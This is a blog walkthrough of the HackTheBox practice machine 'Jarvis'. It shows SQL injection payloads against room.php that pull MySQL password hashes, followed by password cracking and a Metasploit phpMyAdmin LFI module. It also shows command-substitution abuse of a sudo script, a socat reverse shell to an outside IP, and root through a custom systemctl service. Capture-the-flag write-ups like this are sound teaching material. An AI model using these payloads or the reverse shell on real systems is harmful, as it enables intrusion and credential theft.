---
title: 'HackTheBox: Jarvis'
date: 2019-08-19T10:04:56-04:00
categories: [Walkthrough, HackTheBox]
tags: [sqli, mysql, phpmyadmin, lfi, socat, systemctl]
---
## Recon:

<img class="alignnone wp-image-122" src="/assets/img/2019/08/html_cover.png" /> 

The website isn&#8217;t bare, but most of the links found don&#8217;t actually go anywhere. The only page with anything really going on is &#8216;Rooms&#8217;, where you&#8217;ll find the links to the rooms are PHP requests.

### Port Scan

After a thorough port-scan with Nmap you&#8217;ll notice there are the usual ports open:

{% highlight plain_text %}
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
{% endhighlight %}

And also a high port that&#8217;s serving a webpage:

{% highlight plain_text %}
64999/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
{% endhighlight %}

### Web Directory Scan

Performing a directory scan on the regular port 80 shows several folders, and PHPMyAdmin, which is interesting.

{% highlight plain_text %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u supersecurehotel.htb

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://supersecurehotel.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/07/24 12:16:13 Starting gobuster
=====================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 301)
/sass (Status: 301)
/server-status (Status: 403)
=====================================================
2019/07/24 12:30:34 Finished
=====================================================
{% endhighlight %}

## Web Hacking

### Investigating PHPMyAdmin

I tried logging into the PHPMyAdmin with some low-hanging fruit credentials, but no luck there. However, it did give an error message that told my the database being used is MySQL.

<img class="alignnone wp-image-141" src="/assets/img/2019/08/js_phpmyadmin_login.png" /> 

### Investigating room.php

Looking into the source code from the site, I found only one lookup that was functional, and that&#8217;s the room.php lookup. The query could be going to a SQL statement to generate the room details.

Trying a few common things with the input was fruitless. Then I tried to start smaller and see if it&#8217;ll accept an apostrophe. It doesn&#8217;t. Instead, it returns a broken page like so:

<img class="alignnone wp-image-143 size-full" src="/assets/img/2019/08/js_room_broken-1.png" /> 

Then I tried to encode the apostrophe as URL hex code %27 and that didn&#8217;t work either. But then I tried a double URL encoding of %2527 and bingo! There was a normal page view.  
http://10.10.10.143/room.php?cod=3%2527

<img class="alignnone wp-image-144 size-full" src="/assets/img/2019/08/js_room_normal.png" /> 

### SQL Injection

With knowing there&#8217;s a SQL injection on the page, I went into trying some common things to leverage the vulnerability.

`room.php?cod=1%2527 or 1=1`

That returns the first record in the table, which is the first room “1”. So either there&#8217;s a LIMIT operator, or the PHP code only selects the first result to put into the page.

Also, some experimentation shows that only the first quote character needs to be double encoded, and other important characters tested are not even filtered!

`room.php?cod=1%2527 and ('_'='_')`

&#8230; this actually returns a functional result.

At first, I was doing many many queries using EXIST to figure out the shape of the database, but then I found an article online that showed me a _much_ _mo better_ process with SQLi. I&#8217;ve since lost track of the article, sorry.

Step 1 &#8211; Figure out the shape of the table we&#8217;re working with. First get the number of columns in the current table, for use with UNION statements later.

I began using an ORDER BY statement and a &#8216;1&#8217; for the column count.

`room.php?cod=1%2527 order by 1`

Then, increment the column count until it returns an invalid response.

`room.php?cod=1%2527 order by 8`

Since &#8216;8&#8217; is where it breaks, that means 7 columns are good, and that&#8217;s what we need for UNIONs.

Sending a UNION statement with all columns numbered will show where each piece of information goes in the result. One thing, it needs a blank page to start with, so I gave it an invalid room number.

`room.php?cod=99%2527 union select 1,2,3,4,5,6,7`

<img class="alignnone wp-image-145 size-full" src="/assets/img/2019/08/j_sqli_labels.png" /> 

Step 2 &#8211; Request some basic information about the database and it&#8217;s structure.

`room.php?cod=99%2527 union select 1,@@datadir,@@basedir,database(),user(),6,7`

&nbsp;

<img class="alignnone size-full wp-image-190" src="/assets/img/2019/08/js_sqli_basic.png" /> 

Step 3 &#8211; After getting the database name &#8216;hotel&#8217;, I extracted the table and column information.

The below statement retrieves the table name.

`room.php?cod=99%2527 UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.columns where table_schema like 'hotel'`

<img class="alignnone size-full wp-image-150" src="/assets/img/2019/08/js_sqli_table.png" /> 

After that, use a statement like below to extract the columns. Increment the LIMIT operator to get the data out one at a time.

`room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 0,1`

<p class="lang:zsh highlight:0 decode:true">
  <img class="alignnone size-full wp-image-151" src="/assets/img/2019/08/js_sqli_column1.png" />
</p>

`room.php?cod=99%2527 UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns where table_name like 'room' limit 1,1`

<img class="alignnone size-full wp-image-152" src="/assets/img/2019/08/js_sqli_column2.png" /> 

After going through all of the columns until the page breaks, I ended up with the following:

> #### Room
> 
> 1- cod  
> 2- name  
> 3- price  
> 4- descrip  
> 5- star  
> 6- image  
> 7- mini

This is all good info, but it didn&#8217;t get me what I wanted, which was the &#8216;user&#8217; info. The query for extracting the tables doesn&#8217;t show us any more tables besides &#8216;hotel&#8217;. I knew there had to be more, so I tried another table extraction.

`room.php?cod=99%2527 UNION SELECT ALL 1,table_name,3,4,table_name,6,7 FROM information_schema.columns where column_name like 'user' limit 0, 1`

<img class="alignnone size-full wp-image-154" src="/assets/img/2019/08/js_sqli_table2.png" /> 

Now that was getting me other tables, and ones with &#8216;user&#8217; fields! Incrementing the LIMIT operator resulted in quite a lot of tables.

> #### Tables
> 
> PROCESSLIST  
> USER_STATISTICS  
> columns_priv  
> db  
> procs_priv  
> proxies_priv  
> roles_mapping  
> tables_priv  
> user  
> accounts  
> events\_stages\_summary\_by\_account\_by\_event_name  
> events\_stages\_summary\_by\_user\_by\_event_name  
> events\_statements\_summary\_by\_account\_by\_event_name  
> events\_statements\_summary\_by\_user\_by\_event_name  
> events\_waits\_summary\_by\_account\_by\_event_name  
> events\_waits\_summary\_by\_user\_by\_event_name  
> setup_actors  
> users

Two tables stood out, &#8216;user&#8217; and &#8216;users&#8217;. It was time to do a little more investigating by getting the columns of each of these tables using similar statements as before. The resulting table structures are:

> #### user
> 
> Host  
> User  
> Password  
> Select_priv  
> Insert_priv  
> Update_priv  
> Delete_priv  
> Create_priv  
> Drop_priv  
> Reload_priv  
> Shutdown_priv  
> Process_priv  
> File_priv  
> Grant_priv  
> References_priv  
> Index_priv  
> Alter_priv  
> Show\_db\_priv  
> Super_priv  
> Create\_tmp\_table_priv  
> Lock\_tables\_priv  
> Execute_priv  
> Repl\_slave\_priv  
> Repl\_client\_priv  
> Create\_view\_priv  
> Show\_view\_priv  
> Create\_routine\_priv  
> Alter\_routine\_priv  
> Create\_user\_priv  
> Event_priv  
> Trigger_priv  
> Create\_tablespace\_priv  
> ssl_type  
> ssl_cipher  
> x509_issuer  
> x509_subject  
> max_questions  
> max_updates  
> max_connections  
> max\_user\_connections  
> plugin  
> authentication_string  
> password_expired  
> is_role  
> default_role  
> max\_statement\_time
> 
> #### users
> 
> USER  
> CURRENT_CONNECTIONS  
> TOTAL_CONNECTIONS

The only one with a &#8216;password&#8217; column is the table &#8216;user&#8217;. I already knew that the table is not in the &#8216;hotel&#8217; database, so I needed to figure out which one has it.

&nbsp;

`room.php?cod=99%2527 UNION SELECT ALL 1,table_schema,3,4,table_name,6,7 FROM information_schema.columns where table_name like 'user' limit 0,1`

&nbsp;

<img class="alignnone size-full wp-image-156" src="/assets/img/2019/08/js_sqli_database2.png" /> 

It is &#8216;MySQL&#8217;. With that needed bit of info, a statement could be made to extract the credentials.

Step 4 &#8211; Extract the desired fields.

`room.php?cod=99%2527 UNION SELECT ALL 1,Password,3,4,user,6,7 FROM mysql.user limit 0,1`

<img class="alignnone size-full wp-image-157" src="/assets/img/2019/08/js_sqli_password.png" /> 

### Password Cracking

To crack the password, I used John the Ripper. But John needs to know what type of hash it is, so I used a program &#8216;hash-identifier&#8217; to help with that.

<img class="alignnone size-full wp-image-160" src="/assets/img/2019/08/js_pw_hashid.png" /> 

It shows a MySQL5 &#8211; SHA1 hash.

Putting this into John looks like this:

`john &#8211;wordlist=/usr/share/wordlists/rockyou.txt &#8211;format:MySQL-sha1 hashes.txt`

<img class="alignnone size-full wp-image-161" src="/assets/img/2019/08/js_pw_john.png" /> 

The password is **&#8216;imissyou&#8217;**

&nbsp;

### PHPMYADMIN

With credentials found, it was time to go back into the PHPMyAdmin page and see if they work.

Guess what&#8230; it did!

<img class="alignnone wp-image-166 size-full" src="/assets/img/2019/08/js_panel_version.png" /> 

This screenshot shows where to find the version info for PHPMyAdmin once it&#8217;s logged in.

Knowing the version, you can do a google search and find out there&#8217;s a documented local file include issue.

## Server Side Hacking

### Exploitation

Look in Metasploit and you&#8217;ll see an exploit module for the LFI vulnerability.

<img class="alignnone size-full wp-image-168" src="/assets/img/2019/08/js_panel_metasploit.png" /> 

<img class="alignnone size-full wp-image-169" src="/assets/img/2019/08/js_panel_metasploit_options.png" /> 

Once I had a meterpreter shell up, I uploaded &#8220;LinEnum.sh&#8221;.

<img class="alignnone size-full wp-image-172" src="/assets/img/2019/08/js_panel_linenum_upload.png" /> 

LinEnum is a script to get a lot of enumerated info about the system at once. When it&#8217;s run against this host, there&#8217;s one particular bit of information that looks really interesting.

<img class="alignnone size-full wp-image-171" src="/assets/img/2019/08/js_panel_linenum.png" /> 

It&#8217;s useful later for a privilege escalation once we get into the user account ‘pepper’.

The most probable way of getting a priv escalation to the user ‘pepper’ is through a script that can be run with sudo:

<img class="alignnone wp-image-173" src="/assets/img/2019/08/js_panel_linenum_sudo.png" /> 

### User Escalation

`/var/www/Admin-Utilities/simpler.py`

The script can be run as sudo by &#8216;www-data&#8217;!

<img class="alignnone size-full wp-image-180" src="/assets/img/2019/08/js_simpler_output.png" /> 

Wasn&#8217;t sure what to do with it, so I used &#8216;cat&#8217; on it and copied the output to Notepad++ for studying.

I found one probable attack point in the code:

<img class="alignnone size-full wp-image-175" src="/assets/img/2019/08/js_simpler_code.png" /> 

Looks like command substitution can be exploited here since the shell execution characters &#8220;$()&#8221; aren&#8217;t filtered!

I tried to get a shell to work through simpler.py and failed, many times. So to at least get somewhere, I extracted the user.txt with these commands:

`sudo -u pepper ./simpler.py -p`  To get into the script, then `$(cat /home/pepper/user.txt >test.txt)` inside of the script.

To exploit systemctl for the root flag, I had to get a shell working through the simpler.py script.

After trying MANY things, I finally got it to work with a SOCAT shell using the following steps.

1) Set up SOCAT on my kali box with:

`socat file:`tty`,raw,echo=0 TCP-listen:5555`

2) After dropping into a shell from meterpreter:

`sudo -u pepper /var/www/Admin-Utilities/simpler.py -p`

3) From within simpler.py:

`$(bash)`

This allowed me to bypass the filtered characters since I need some of them. This bash shell will only allow a single command due to limitations in the injection vuln.

Then set up a socat connection with `socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:10.10.15.29:5555`

<img class="alignnone size-full wp-image-182" src="/assets/img/2019/08/js_simpler_socat.png" /> 

### Root Escalation

Tried to use the &#8216;systemctl&#8217; command for the next escalation. My first plan was to see if a shell breakout from &#8216;less&#8217; through &#8216;systemctl status&#8217; would give me root permissions.

But I got an error that the shell isn&#8217;t good enough:

<img class="alignnone size-full wp-image-184" src="/assets/img/2019/08/js_systemctl_status.png" /> 

&#8230; and when I broke out of &#8216;less&#8217;, it didn&#8217;t give root permissions as I had hoped.

I did some research on what &#8216;systemctl&#8217; is used for and figured I could create my own service, which does certainly run as root and use it to spawn a shell to use.

Here&#8217;s a very simple service setup that I used:

<img class="alignnone size-full wp-image-185" src="/assets/img/2019/08/js_systemctl_service.png" /> 

And my script that is referenced in the service:

<img class="alignnone size-full wp-image-186" src="/assets/img/2019/08/js_systemctl_service_script.png" /> 

Afterward, I realized it would have been more efficient to put the script command directly in the service setup, but whatever, it works this way too.

I first tried making it in the /tmp directory, but when using &#8216;systemctl&#8217; on it I&#8217;d get an error about the file not found!

Eventually, I realized it&#8217;s because the tmp folder has the sticky bit set where only I can see the files I make in there, so the systemctl was operating under another UID, and couldn&#8217;t find it.

Then I moved the files to pepper&#8217;s home directory and it worked beautifully!

See the following screenshot for the command to get the service to work:

<img class="alignnone size-full wp-image-187" src="/assets/img/2019/08/js_systemctl_service_run.png" /> 

And proof on my box:

<img class="alignnone size-full wp-image-188" src="/assets/img/2019/08/js_root_proof.png" />